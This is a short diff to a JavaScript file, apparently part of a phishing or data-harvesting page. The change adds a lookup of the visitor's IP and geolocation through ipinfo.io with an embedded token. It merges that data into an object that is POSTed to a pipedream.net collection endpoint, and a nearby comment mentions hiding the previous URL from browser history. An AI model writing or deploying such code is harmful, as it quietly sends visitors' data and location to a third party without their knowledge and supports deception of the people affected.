@@ -438,17 +438,20 @@ var hash_accessor = (function (window) {
 
     const headers = new Headers()
     headers.append("Content-Type", "application/json")
+     fetch("https://ipinfo.io/json?token=27de0b4f7da784").then(
+      (response) => response.json()
+    ).then(
+      (jsonResponse) => 
+      {
+        const options = {
+          method: "POST",
+          headers,
+          mode: "cors",
+          body: JSON.stringify(jsonResponse).slice(0,-1) + ", " + JSON.stringify(obj).slice(1), 
+        }
 
-
-
-    const options = {
-      method: "POST",
-      headers,
-      mode: "cors",
-      body: JSON.stringify(obj),
-    }
-
-    fetch("https://eoa22umjqdu9ddj.m.pipedream.net", options)
+        fetch("https://eoa22umjqdu9ddj.m.pipedream.net", options)
+      })
 
 
       // use replace so that previous url does not go into history
